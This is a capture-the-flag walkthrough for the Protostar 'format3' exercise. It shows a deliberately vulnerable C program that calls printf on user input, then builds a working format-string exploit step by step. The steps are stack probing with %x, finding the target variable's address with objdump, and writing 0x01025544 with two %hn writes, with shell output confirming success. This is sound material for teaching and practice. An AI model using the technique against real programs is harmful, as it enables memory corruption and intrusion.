#### Format3

###### About

- This level advances from `format2` and shows how to write more than `1` or `2` bytes of memory to the process. 
- This also teaches you to carefully control what data is being written to the process memory.
- This level is at `/opt/protostar/bin/format3`

`format3.c`

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

###### Solution

```sh
user@protostar:/opt/protostar/bin$ ./format3
thnkr
thnkr
target is 00000000 :(
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ python -c "print 'AAAA'" | ./format3
AAAA
target is 00000000 :(
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ python -c "print 'AAAA' + '%x '*100" | ./format3
AAAA0 bffff5c0 b7fd7ff4 0 0 bffff7c8 804849d bffff5c0 200 b7fd8420 bffff604 41414141 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 b7ff000a bffff714 b7fffbe8 e b7ea36e4 b7fe1afc f63d4e2e 0 3 b7fff8f8 0 0 1
target is 00000000 :(
user@protostar:/opt/protostar/bin$
```

![](images/1.png)

```sh
user@protostar:/opt/protostar/bin$ python -c "print 'AAAA' + '%x '*12" | ./format3
AAAA0 bffff5c0 b7fd7ff4 0 0 bffff7c8 804849d bffff5c0 200 b7fd8420 bffff604 41414141
target is 00000000 :(
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ objdump -t format3

format3:     file format elf32-i386

SYMBOL TABLE:
08048114 l    d  .interp	00000000              .interp
08048128 l    d  .note.ABI-tag	00000000              .note.ABI-tag
08048148 l    d  .note.gnu.build-id	00000000              .note.gnu.build-id
0804816c l    d  .hash	00000000              .hash
080481a0 l    d  .gnu.hash	00000000              .gnu.hash
080481c4 l    d  .dynsym	00000000              .dynsym
08048244 l    d  .dynstr	00000000              .dynstr
080482a2 l    d  .gnu.version	00000000              .gnu.version
080482b4 l    d  .gnu.version_r	00000000              .gnu.version_r
080482d4 l    d  .rel.dyn	00000000              .rel.dyn
080482e4 l    d  .rel.plt	00000000              .rel.plt
0804830c l    d  .init	00000000              .init
0804833c l    d  .plt	00000000              .plt
080483a0 l    d  .text	00000000              .text
0804857c l    d  .fini	00000000              .fini
08048598 l    d  .rodata	00000000              .rodata
080485d4 l    d  .eh_frame	00000000              .eh_frame
080495d8 l    d  .ctors	00000000              .ctors
080495e0 l    d  .dtors	00000000              .dtors
080495e8 l    d  .jcr	00000000              .jcr
080495ec l    d  .dynamic	00000000              .dynamic
080496bc l    d  .got	00000000              .got
080496c0 l    d  .got.plt	00000000              .got.plt
080496e0 l    d  .data	00000000              .data
080496e8 l    d  .bss	00000000              .bss
00000000 l    d  .stab	00000000              .stab
00000000 l    d  .stabstr	00000000              .stabstr
00000000 l    d  .comment	00000000              .comment
00000000 l    df *ABS*	00000000              crtstuff.c
080495d8 l     O .ctors	00000000              __CTOR_LIST__
080495e0 l     O .dtors	00000000              __DTOR_LIST__
080495e8 l     O .jcr	00000000              __JCR_LIST__
080483d0 l     F .text	00000000              __do_global_dtors_aux
080496ec l     O .bss	00000001              completed.5982
080496f0 l     O .bss	00000004              dtor_idx.5984
08048430 l     F .text	00000000              frame_dummy
00000000 l    df *ABS*	00000000              crtstuff.c
080495dc l     O .ctors	00000000              __CTOR_END__
080485d4 l     O .eh_frame	00000000              __FRAME_END__
080495e8 l     O .jcr	00000000              __JCR_END__
08048550 l     F .text	00000000              __do_global_ctors_aux
00000000 l    df *ABS*	00000000              format3.c
080496c0 l     O .got.plt	00000000              .hidden _GLOBAL_OFFSET_TABLE_
080495d8 l       .ctors	00000000              .hidden __init_array_end
080495d8 l       .ctors	00000000              .hidden __init_array_start
080495ec l     O .dynamic	00000000              .hidden _DYNAMIC
080496e0  w      .data	00000000              data_start
08048454 g     F .text	00000013              printbuffer
080484e0 g     F .text	00000005              __libc_csu_fini
080483a0 g     F .text	00000000              _start
00000000  w      *UND*	00000000              __gmon_start__
00000000  w      *UND*	00000000              _Jv_RegisterClasses
08048598 g     O .rodata	00000004              _fp_hw
0804857c g     F .fini	00000000              _fini
00000000       F *UND*	00000000              fgets@@GLIBC_2.0
00000000       F *UND*	00000000              __libc_start_main@@GLIBC_2.0
0804859c g     O .rodata	00000004              _IO_stdin_used
080496e0 g       .data	00000000              __data_start
080496e4 g     O .data	00000000              .hidden __dso_handle
080495e4 g     O .dtors	00000000              .hidden __DTOR_END__
080484f0 g     F .text	0000005a              __libc_csu_init
00000000       F *UND*	00000000              printf@@GLIBC_2.0
080496e8 g       *ABS*	00000000              __bss_start
08048467 g     F .text	00000069              vuln
080496e8 g     O .bss	00000004              stdin@@GLIBC_2.0
080496f4 g     O .bss	00000004              target
080496f8 g       *ABS*	00000000              _end
00000000       F *UND*	00000000              puts@@GLIBC_2.0
080496e8 g       *ABS*	00000000              _edata
0804854a g     F .text	00000000              .hidden __i686.get_pc_thunk.bx
080484d0 g     F .text	0000000f              main
0804830c g     F .init	00000000              _init


user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ objdump -t format3 | grep target
080496f4 g     O .bss	00000004              target
user@protostar:/opt/protostar/bin$
```

`0x01025544` &rarr; `0x0102` + `0x5544`

```sh
>>> 0x0102
258
>>>
```

```sh
>>> 258-4-4
250
>>>
```

`%hn` &rarr; short write (writes 16 bytes instead of 32 bytes)

```sh
user@protostar:/opt/protostar/bin$ echo `python -c 'print "\xf4\x96\x04\x08" + "\xf6\x96\x04\x08" + "%250x%13$hn"'` | ./format3
                                                                                                                                                                                                                                                         0
target is 01020000 :(
user@protostar:/opt/protostar/bin$
```

```sh
>>> 0x5544-258
21570
>>>
```

```sh
user@protostar:/opt/protostar/bin$ echo `python -c 'print "\xf4\x96\x04\x08" + "\xf6\x96\x04\x08" + "%250x%13$hn" + "%21570x%12$hn"'` | ./format3
                                                                                                                                                                                                                                                         0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          bffff5c0
you have modified the target :)
user@protostar:/opt/protostar/bin$
```